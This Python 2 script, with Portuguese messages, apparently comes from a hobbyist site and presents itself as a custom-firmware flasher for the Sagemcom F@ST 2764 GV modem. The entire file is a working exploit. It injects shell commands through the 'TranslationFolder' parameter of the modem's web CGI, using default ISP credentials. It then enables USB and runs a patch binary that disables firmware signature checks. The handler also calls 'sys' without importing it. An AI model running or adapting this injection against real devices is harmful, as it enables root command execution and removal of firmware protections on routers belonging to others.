#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#
# Copyright (C) 2014  Triple Oxygen <oxy@g3n.org>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

import urllib
import urllib2
import base64
import time
import signal

def signal_handler(signal, frame):
    print("[-] Finalizando.")
    sys.exit(0)

def send_command(host, auth, cmd):
    url = "http://%s/index.cgi?script=cms_cgi&action=GetListOfFiles&TranslationFolder=x;%s" % (host, urllib.quote_plus(cmd)) # ;)
    req = urllib2.Request(url)
    req.add_header("Authorization", "Basic " + auth)

    try:
        result = urllib2.urlopen(req)
        return result.read()
    except IOError, e:
        print "[-] Erro: %s" % (e.reason)

def enable_usb(host, auth):
    
    send_command(host, auth, "echo \"bit1e=1\" > /proc/driver/gpio/bits")
    
    time.sleep(3)
    
    print "[!] Insira o pen-drive com os arquivos no diretorio raiz, aguarde 10 segundos e pressione <ENTER>"
    raw_input()

    mount = send_command(host, auth, "mount").strip()
    mount_usb = send_command(host, auth, "mount | grep '/usb/'").strip()

    if mount_usb == None or mount_usb == "" or mount_usb == "EMPTY GetListOfFiles":
        print "[-] Falha ao obter ponto de montagem. Tente novamente aguardando um tempo maior ate dar ENTER ou tente com outro disco."
        print "[-] Debug"
        print mount
        return None

    mount_point = mount_usb.split(' ')[2]	
    print "\t-> Ponto de montagem: %s\n" % (mount_point)
    
    return mount_point
	
def patch_permst(host, auth, mount_point):
    
    send_command(host, auth, "cp %s/permstpatch /tmp/" % (mount_point))
    send_command(host, auth, "chmod +x /tmp/permstpatch")
    patch_output = send_command(host, auth, "/tmp/permstpatch 0")

    if patch_output == None:
        return False

    if "Sucesso" not in patch_output:
        print "[-] Debug"
        print patch_output
        return False

    return True
	
def main():
    signal.signal(signal.SIGINT, signal_handler)
    success = False

    print ""
    print "Sagemcom F@ST 2764 GV Custom Image Flasher"
    print "Copyright (C) 2014  Triple Oxygen <oxy@g3n.org>"
    print ""
    print "Caso não funcione na primeira vez, reinicie o modem e tente novamente."
    print ""
           
    host = raw_input("IP do modem [deixe em branco para '192.168.25.1']: ")
    if(host is ''):
        host = "192.168.25.1"
        
    username = raw_input("Usuário [deixe em branco para 'admin']: ")
    if(username is ''):
        username = "admin"

    password = raw_input("Senha [deixe em branco para 'gvt12345']: ")
    if(password is ''):
        password = "gvt12345"

    print ""

    print "[!] Esta ferramenta modificara a flash de seu modem para permitir imagens nao assinadas, e entao, gravar a imagem especificada acima."
    print "[!] Leia todos os passos e consideracoes listadas no post relativo em http://g3n.org antes de prosseguir."
    print ""
    print "[!] Pressione <ENTER> para continuar ou feche o programa."

    raw_input()

    auth = base64.encodestring(b"%s:%s" % (username, password))[:-1]

    print "[!] Tenha em maos um pen-drive formatado em FAT32 ou ext2/3 com a imagem a ser gravada e o 'permstpatch', ambos no diretorio raiz."
    print ""

    print "[+] Ativando porta USB e obtendo ponto de montagem"
    mount_point = enable_usb(host, auth)

    if mount_point is not None:
        print "[+] Modificando flash para permitir imagens nao assinadas."
        success = patch_permst(host, auth, mount_point)

    if success == True:
        print "[+] Sucesso."
    else:
        print "[-] Falha ao desativar assinaturas. Informe toda a saida deste programa no http://g3n.org"
   
    print ""

    return

if __name__ == '__main__':
	main()

